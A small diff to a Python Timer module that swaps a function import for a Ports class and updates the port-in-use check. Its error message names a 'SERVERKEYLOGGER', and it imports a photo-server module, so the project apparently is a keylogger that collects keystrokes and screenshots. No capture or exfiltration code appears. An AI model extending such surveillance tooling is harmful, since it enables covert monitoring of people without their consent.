@@ -1,7 +1,7 @@
 import time
 import socket
 from .Server_photos import ServerPhotos
-from .Port_data import get_working_ports
+from .Port_data import Ports
 import os
 
 class Timer:
@@ -42,7 +42,8 @@ class Timer:
             self.countdown(seconds)
 
         except OSError:
-            working_port = get_working_ports()
+            working_port = Ports.get_working_ports()
             if str(self.port) in working_port:
                 print(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERKEYLOGGER. PORT NUMBER: {self.port} already in use")
                 os._exit(0)
+                
